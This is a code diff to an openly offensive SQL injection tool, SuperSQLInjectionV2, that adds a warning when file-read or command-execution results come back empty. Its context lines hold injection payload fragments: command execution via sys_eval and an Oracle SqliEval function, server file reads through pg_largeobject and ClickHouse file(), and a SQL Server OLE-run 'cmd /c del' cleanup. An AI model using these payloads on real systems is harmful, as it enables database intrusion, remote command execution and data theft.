@@ -27,6 +27,19 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
         }
 
         /// <summary>
+        /// 输出操作结果长度；0字节时补充警告（目标可能不支持该方式/权限不足/文件不存在/命令无输出），
+        /// 避免静默空结果让用户误以为成功（如Linux SQL Server无xp_cmdshell、金仓阉割COPY FROM PROGRAM等场景）
+        /// </summary>
+        private static void ShowResultLen(string prefix, int len, string suffix = "")
+        {
+            Log.Show(prefix + len + "字节！" + suffix);
+            if (len <= 0)
+            {
+                Log.Warning("结果为0字节！可能原因：目标环境不支持该方式/权限不足/文件不存在或为空/命令无回显，请换其他方式或核实目标环境。");
+            }
+        }
+
+        /// <summary>
         /// 堆叠通道自动切换：操作需要堆叠注入而当前注入类型非堆叠时，查注入通道注册表（检测记录）
         /// 中同目标同参数是否登记过堆叠记录；有则自动切换注入类型为堆叠（带出时间盲注oracle所需的
         /// BoolInjectType/CheckValue/Revers），并日志告知用户；无则返回false，调用方走原有告警逻辑
@@ -214,7 +227,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                     break;
             }
             vm.SetFileContent(result);
-            Log.Show("读文件完成，内容长度：" + result.Length + "字节！");
+            ShowResultLen("读文件完成，内容长度：", result.Length);
         }
 
         /// <summary>
@@ -419,7 +432,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                         break;
                 }
                 vm.SetFileContent(result);
-                Log.Show("读文件完成，内容长度：" + result.Length + "字节！");
+                ShowResultLen("读文件完成，内容长度：", result.Length);
             }
             finally
             {
@@ -825,7 +838,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 Log.SysLog("命令已执行：" + vm.CmdText);
                 string result = await FetchScalar(config, "(select sys_eval('" + cmdEsc + "'))").ConfigureAwait(false);
                 vm.SetCmdResult(result);
-                Log.Show("命令执行完成，获取到结果长度：" + (result ?? "").Length + "字节！");
+                ShowResultLen("命令执行完成，获取到结果长度：", (result ?? "").Length);
             }
             catch (OperationCanceledException)
             {
@@ -904,7 +917,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 Log.SysLog("命令已执行：" + vm.CmdText);
                 string result = await FetchScalar(config, sysEvalPayload).ConfigureAwait(false);
                 vm.SetCmdResult(result);
-                Log.Show("命令执行完成，获取到结果长度：" + result.Length + "字节！");
+                ShowResultLen("命令执行完成，获取到结果长度：", result.Length);
             }
             catch (OperationCanceledException)
             {
@@ -999,7 +1012,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                             }
                             break;
                     }
-                    Log.Show("命令执行完成，获取到结果长度：" + result.Length + "字节！");
+                    ShowResultLen("命令执行完成，获取到结果长度：", result.Length);
                 }
                 finally
                 {
@@ -1104,7 +1117,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                             }
                             break;
                     }
-                    Log.Show("命令执行完成，获取到结果长度：" + result.Length + "字节！");
+                    ShowResultLen("命令执行完成，获取到结果长度：", result.Length);
                 }
                 finally
                 {
@@ -1188,7 +1201,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                         }
                         break;
                 }
-                Log.Show("读文件完成，内容长度：" + result.Length + "字节！");
+                ShowResultLen("读文件完成，内容长度：", result.Length);
             }
             catch (OperationCanceledException)
             {
@@ -1278,7 +1291,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 string hex = await FetchScalar(config, "(select coalesce(string_agg(encode(data,'hex'),'' order by pageno),'') from pg_largeobject where loid=" + oid + ")").ConfigureAwait(false);
                 string result = TextCodec.unHex(hex ?? "", vm.FileEncoding);
                 vm.SetFileContent(result);
-                Log.Show("读文件完成，内容长度：" + result.Length + "字节！（需superuser或pg_read_server_files，失败时内容为空）");
+                ShowResultLen("读文件完成，内容长度：", result.Length, "（需superuser或pg_read_server_files，失败时内容为空）");
             }
             finally
             {
@@ -1390,7 +1403,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                         }
                         break;
                 }
-                Log.Show("读文件完成，内容长度：" + result.Length + "字节！（file()仅能读user_files目录内文件）");
+                ShowResultLen("读文件完成，内容长度：", result.Length, "（file()仅能读user_files目录内文件）");
             }
             catch (OperationCanceledException)
             {
@@ -1596,7 +1609,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 Log.SysLog("命令已执行：" + vm.CmdText);
                 string result = await FetchScalar(config, "(select SqliEval(utl_raw.cast_to_varchar2(hextoraw('" + cmdHex + "'))) from dual)").ConfigureAwait(false);
                 vm.SetCmdResult(result);
-                Log.Show("命令执行完成，获取到结果长度：" + (result ?? "").Length + "字节！（varchar2上限4000字符；管道/重定向请自行加 cmd /c 或 /bin/sh -c）");
+                ShowResultLen("命令执行完成，获取到结果长度：", (result ?? "").Length, "（varchar2上限4000字符；管道/重定向请自行加 cmd /c 或 /bin/sh -c）");
             }
             catch (OperationCanceledException)
             {
@@ -1617,7 +1630,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 string pathHex = Convert.ToHexString(Encoding.UTF8.GetBytes(vm.FilePath));
                 string result = await FetchScalar(config, "(select SqliRead(utl_raw.cast_to_varchar2(hextoraw('" + pathHex + "'))) from dual)").ConfigureAwait(false);
                 vm.SetFileContent(result ?? "");
-                Log.Show("读文件完成，内容长度：" + (result ?? "").Length + "字节！（varchar2上限4000字符，二进制文件请用其他通道）");
+                ShowResultLen("读文件完成，内容长度：", (result ?? "").Length, "（varchar2上限4000字符，二进制文件请用其他通道）");
             }
             catch (OperationCanceledException)
             {
@@ -1691,7 +1704,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 Log.SysLog("命令已执行：" + vm.CmdText);
                 string result = await FetchScalar(config, "SQX(" + chain + ")").ConfigureAwait(false);
                 vm.SetCmdResult(result ?? "");
-                Log.Show("命令执行完成，获取到结果长度：" + (result ?? "").Length + "字节！");
+                ShowResultLen("命令执行完成，获取到结果长度：", (result ?? "").Length);
             }
             catch (OperationCanceledException)
             {
@@ -1724,7 +1737,7 @@ namespace SuperSQLInjectionV2.ViewModels.Tools
                 }
                 string result = await ReadSqlServerFileText(config, outFile).ConfigureAwait(false);
                 vm.SetCmdResult(result);
-                Log.Show("命令执行完成，获取到结果长度：" + (result ?? "").Length + "字节！");
+                ShowResultLen("命令执行完成，获取到结果长度：", (result ?? "").Length);
                 try
                 {
                     await SendPayload(config, OleRun("cmd /c del /f /q \"" + winOut + "\"")).ConfigureAwait(false);
